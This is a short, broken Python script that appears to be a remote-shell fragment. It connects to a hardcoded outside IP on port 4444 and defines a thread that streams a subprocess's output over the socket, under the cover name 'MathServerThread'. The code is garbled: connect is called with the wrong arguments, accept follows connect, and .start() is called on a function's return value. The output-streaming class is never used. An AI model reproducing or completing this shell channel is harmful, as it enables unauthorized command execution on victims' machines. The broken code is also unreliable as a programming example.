from subprocess import Popen, STDOUT, PIPE
from threading import Thread
import socket 


HOST = '59.96.19.148'
PORT = 4444
con = []

#Full Duplex Process Commuication.
class ProcessOutputThread(Thread):
	def __init__(self, p, c, a):
		Thread.__init__(self)
		self.p = p
		self.c = c
		self.a = a

	def run(self):
		while self.p.poll() is None:
			try:
				self.c.sendall(self.p.stdout.readline())
			except:
				print("Connection reset for {}".format(self.a[0]))
				con.remove(self.a[0])


def MathServerThread():
    	print("connected")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.connect(HOST,PORT)
threads = 40
while threads>1:
    
	conn, addr = s.accept()
	t = MathServerThread()
	t.start()
